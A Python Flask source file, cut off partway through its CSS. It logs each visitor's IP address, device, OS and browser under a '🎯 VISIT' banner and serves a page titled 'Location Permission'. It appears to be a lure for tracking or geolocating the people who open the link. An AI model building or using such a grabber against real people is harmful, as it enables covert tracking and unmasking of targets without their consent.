from flask import Flask, request, jsonify
from user_agents import parse
import sys

app = Flask(__name__)

def get_real_ip(req):
    forwarded_for = req.headers.get('X-Forwarded-For')
    return forwarded_for.split(',')[0].strip() if forwarded_for else req.remote_addr

@app.route('/')
def index():
    real_ip = get_real_ip(request)

    ua_string = request.headers.get('User-Agent', '')
    user_agent = parse(ua_string)

    device_model = user_agent.device.model or "Generic PC/Device"
    os_info = f"{user_agent.os.family} {user_agent.os.version_string}".strip()
    browser_info = f"{user_agent.browser.family} {user_agent.browser.version_string}".strip()

    print(f"\\n🎯 VISIT")
    print(f"IP: {real_ip}")
    print(f"DEVICE: {device_model}")
    print(f"OS: {os_info}")
    print(f"BROWSER: {browser_info}")
    print(f"------------------------------", file=sys.stdout, flush=True)

    return f"""
    <!doctype html>
    <html lang="fa">
    <head>
      <meta charset="utf-8" />
      <meta name="viewport" content="width=device-width, initial-scale=1" />
      <title>Location Permission</title>
      <style>
        body {{
          font-family: sans-serif;
          display:flex;
          justify-content:center;
          align-items:center;
          min-height:100vh;
          margin:0;
          background:#0e1111;
          color:white;
        }}
        .card {{
          background:#1c1c1c;
          padding:30px;
          border-radius:20px;
          border:1px solid #333;
          width:80%;
          max-width:420px;
          text-align:center;
        }}
        button {{
          margin-top:20px;
          background:#00d4ff;
          color:black;
          border:none;
          padding:12px 18px;
          border-radius:12px;
          font-weight:bold;
          cursor:pointer;
        }}
        .small {{
          color:#aaa;
          font-size:14px;
          margin-top:15px;
